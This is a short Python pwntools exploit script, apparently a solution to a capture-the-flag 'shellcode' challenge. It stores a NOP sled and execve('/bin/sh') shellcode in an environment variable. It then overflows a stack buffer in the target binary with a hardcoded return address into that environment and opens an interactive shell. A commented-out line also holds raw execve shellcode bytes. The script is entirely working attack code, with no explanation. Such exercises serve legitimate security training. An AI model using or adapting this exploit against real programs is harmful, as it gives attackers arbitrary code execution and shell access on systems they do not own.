#!/usr/bin/env python3
from pwn import *

# p = process(['strace', './target'], stderr=2)
# shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # execve("/bin/sh")

context.update(arch='amd64', os='linux')
shellcode = b"\x90" * 10000   # NOP 슬라이드
shellcode += asm(shellcraft.sh())


# 환경 변수 설정
env = os.environ.copy()
env['SHELLCODE']= shellcode
print('-----------------')
# print(env)
# p = process(exe, env=env)
# p = process(['strace', './target'], stderr=2)

# p = process(['strace','/challenges/03-shellcode/target'],env=env)
p = process(['/challenges/03-shellcode/target'],env=env)
# p = process(['./target'], env=env)
# p = process(['strace','./getenv'] ,stderr=2)


# p = process(['strace', './getenv'], stderr=2)
e = ELF('./target')
# env_addr = p64(0x5fff0000001a)
env_addr = p64(0x5fff00001010)
# data = p.readmem(0x5fff0000001a,10023)
# print(data.hex())
# env_addr = "\x10\x10\x00\x00\x00\xff\x5f"
payload = b'A' * 128
payload += b'B' * 8
payload += env_addr

print(payload)
p.send(payload)
# rip_address = p.readmem(0x7fffffffe018,1)
# print(rip_address.hex())
p.interactive()